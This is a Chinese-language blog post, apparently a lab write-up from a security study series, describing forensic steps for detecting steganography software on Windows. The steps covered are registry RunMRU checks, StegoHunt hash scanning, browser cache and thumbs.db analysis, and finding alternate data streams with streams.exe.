<h2 id="实验步骤-6"><a href="#实验步骤-6" class="headerlink" title="实验步骤"></a>实验步骤</h2><p> 一、 查找数据隐藏软件<br>1.1    查看Windows注册表中的键值，查看最近使用的软件列表“HKEY_CURRENT_USE\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU”。<br><img src="/images/loading.gif" data-original="/posts/3253fafc/image-20200218001844202.png" alt="image-20200218001844202"><br> 二、 查找残留的人工痕迹<br>2.1    当调查一台计算机时，从计算机的注册表项到临时目录都是调查人员取证分析的主要渠道。还有一个方法是可以识别计算机中是否包含（或者运行过）隐写软件，调查人员可以用一些检查工具扫描计算机中的文件，然后通过对比散列值来判断该计算机中是否曾经安装过数据隐藏软件，这些工具也可以用来查找数据隐藏软件被卸载后残留在注册表中的痕迹，其中最为知名的工具便是WetStone的StegoHunt软件，它可以扫描磁盘、目录、取证图像文件和联网的计算机来检测是否存在数据隐藏程序。 </p>
<p><img src="/images/loading.gif" data-original="/posts/3253fafc/image-20200218001905744.png" alt="image-20200218001905744"></p>
<p> 三、 识别和浏览图像缓存<br>3.1    除了扫描数据隐藏文件外，调查人员还会尝试检查一些提供数据隐藏软件下载的知名网站，完全有必要分析可疑计算机访问的网站和上网历史。数据隐藏软件很可能是通过进行数据隐藏操作的同一台计算机下载的，那么分析这台计算机访问过的URL和缓存图像后就可以决定是否有必要对该计算机进行进一步的全面调查。3.2    对于取证调查人员来说，除了浏览可疑计算机中的静态图像外，检测其中的缓存图像也很重要。如果数据隐藏程序、载体文件和有效载荷文件已经被嫌疑人删除，但缓存目录中可能还存在相关的图像，其中可能包含嫌疑人访问数据隐藏软件网站的证据。通用的工具是STG Cache Audit，这是一个基于Windows的、网页缓存、cookie和历史记录的高级查看器。 </p>
<p><img src="/images/loading.gif" data-original="/posts/3253fafc/image-20200218001926858.png" alt="image-20200218001926858"></p>
<p> 四、 缩略图中的痕迹<br>4.1    在可疑计算机上还可以检测另一类缓存信息：缩略图。在Windows操作系统中，缩略图主要用于快速浏览文件夹中的文件，缩略图视图同时还会在文件夹中创建一个thumbs.db文件，该文件夹中存储了图像形式的文件最小版本及文件首页等信息。我们并不能直接从缩略图中检测到隐藏数据，但的确可以使调查人员从中发现一些可能已经嵌入到了其他文件中的可疑数据。<br>4.2    若要查看缩略图数据库，可按“Alt”键选择资源浏览器中呼出的“工具”栏，选择“文件夹选项”。<br><img src="/images/loading.gif" data-original="/posts/3253fafc/image-20200218002010179.png" alt="image-20200218002010179"><br> 4.3    在文件夹选项中选择“查看”标签，取消“高级设置”中的“隐藏受保护的操作系统文件（推荐）”并应用，设置完成之后便可查看缩略图数据库文件。<br><img src="/images/loading.gif" data-original="/posts/3253fafc/image-20200218002023749.png" alt="image-20200218002023749"><br> 4.4    在Windows Server 2008 R2中，thumbs.db文件集中存储在用户文件夹中(C:\Users\Administrator\AppData\Local\Microsoft\Windows\Explorer)。<br><img src="/images/loading.gif" data-original="/posts/3253fafc/image-20200218002032702.png" alt="image-20200218002032702"><br> 4.5    同样的，也有很多软件可以查看和分析thumbs.db文件，如Thumbnail Database Viewer，该工具可以自行选择待分析的thumbs.db文件，也可以通过它的搜索功能找到所有的thumbs.db文件。<br><img src="/images/loading.gif" data-original="/posts/3253fafc/image-20200218002039322.png" alt="image-20200218002039322"><br> 4.6    通常情况下，即使图片文件被删除或转移了，它的缩略图也会一直保留在thumbs.db文件中，除非手动删除。 </p>
<p> 五、 查找隐藏目录和文件5.1    streams.exe检测交换数据流中的隐藏文件，创建交换数据流文件并检测。<br><img src="/images/loading.gif" data-original="/posts/3253fafc/image-20200218002045885.png" alt="image-20200218002045885"></p>
]]></content>
      <categories>
        <category>信息安全学习</category>
      </categories>
      <tags>
        <tag>数据隐藏</tag>
      </tags>
  </entry>
</search>
